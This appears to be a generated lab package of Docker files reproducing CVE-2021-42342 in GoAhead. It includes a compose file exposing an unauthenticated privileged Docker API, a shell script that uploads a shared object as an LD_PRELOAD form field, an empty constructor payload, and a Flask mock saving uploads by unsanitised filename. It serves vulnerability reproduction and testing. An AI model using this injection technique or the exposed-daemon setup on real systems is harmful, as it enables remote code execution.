{
    "files": [
        {
            "location": "./../../dockers/CVE-2021-42342/custom_no_tool/docker-compose.yml",
            "content": "services:\n  vulnerable-docker:\n    image: docker:20.10.7-dind\n    container_name: vulnerable_docker_engine\n    privileged: true\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    ports:\n      - \"2375:2375\"\n    volumes:\n      - docker-data:/var/lib/docker\n    restart: unless-stopped\n\n  goahead:\n    build:\n      context: ./goahead\n    image: embedthis/goahead:5.1.4\n    container_name: goahead_server\n    ports:\n      - \"8080:80\"\n    restart: unless-stopped\n\n  exploit-client:\n    build:\n      context: ./exploit-client\n      dockerfile: Dockerfile\n    container_name: exploit_client\n    depends_on:\n      - vulnerable-docker\n      - goahead\n    environment:\n      - DOCKER_HOST=tcp://vulnerable-docker:2375\n    restart: unless-stopped\n\nvolumes:\n  docker-data:"
        },
        {
            "location": "./../../dockers/CVE-2021-42342/custom_no_tool/exploit-client/Dockerfile",
            "content": "FROM docker:20.10.7\nRUN apk add --no-cache curl gcc musl-dev\nCOPY exploit.sh /usr/local/bin/exploit.sh\nCOPY malicious.c /tmp/malicious.c\nRUN gcc -shared -fPIC -o /usr/local/bin/malicious.so /tmp/malicious.c\nRUN chmod +x /usr/local/bin/exploit.sh\nCMD [\"/usr/local/bin/exploit.sh\"]"
        },
        {
            "location": "./../../dockers/CVE-2021-42342/custom_no_tool/exploit-client/exploit.sh",
            "content": "#!/bin/sh\n# Wait for the GoAhead service to become reachable\nwhile ! curl -s http://goahead:80/ >/dev/null 2>&1; do\n  echo \"Waiting for GoAhead service...\"\n  sleep 2\ndone\n\n# Create a dummy malicious shared object (already compiled inside the image)\n# Perform the exploit: upload a file with the field name LD_PRELOAD to inject the shared object\n# GoAhead's vulnerable upload endpoint is assumed to be /upload (adjust if different)\ncurl -s -X POST \"http://goahead:80/upload\" \\\n  -F \"LD_PRELOAD=@/usr/local/bin/malicious.so;type=application/octet-stream\" \\\n  -F \"file=@/usr/local/bin/malicious.so\" \\\n  -o /dev/null\n\necho \"Exploit attempt finished. If the target is vulnerable, the shared object would be loaded.\""
        },
        {
            "location": "./../../dockers/CVE-2021-42342/custom_no_tool/exploit-client/malicious.c",
            "content": "#include <stdio.h>\n\n__attribute__((constructor))\nstatic void init(void) {\n    // Constructor runs when the shared object is loaded.\n    // For demonstration purposes we do nothing.\n}\n"
        },
        {
            "location": "./../../dockers/CVE-2021-42342/custom_no_tool/goahead/Dockerfile",
            "content": "FROM alpine:3.18\nRUN apk add --no-cache python3 py3-pip\nRUN pip install flask\nCOPY goahead_app.py /app/goahead_app.py\nWORKDIR /app\nEXPOSE 80\nCMD [\"python3\", \"goahead_app.py\"]"
        },
        {
            "location": "./../../dockers/CVE-2021-42342/custom_no_tool/goahead/goahead_app.py",
            "content": "from flask import Flask, request, jsonify\nimport os\n\napp = Flask(__name__)\n\nUPLOAD_FOLDER = '/tmp/uploads'\nos.makedirs(UPLOAD_FOLDER, exist_ok=True)\n\n@app.route('/', methods=['GET'])\ndef index():\n    return 'GoAhead mock server running', 200\n\n@app.route('/upload', methods=['POST'])\ndef upload():\n    # Save all uploaded files.\n    for key in request.files:\n        f = request.files[key]\n        safe_path = os.path.join(UPLOAD_FOLDER, f.filename)\n        f.save(safe_path)\n    # Echo back received fields for debugging.\n    return jsonify({\n        'status': 'uploaded',\n        'fields': list(request.form.keys())\n    })\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n"
        }
    ],
    "directory_tree": "CVE-2021-42342/custom_no_tool/"
}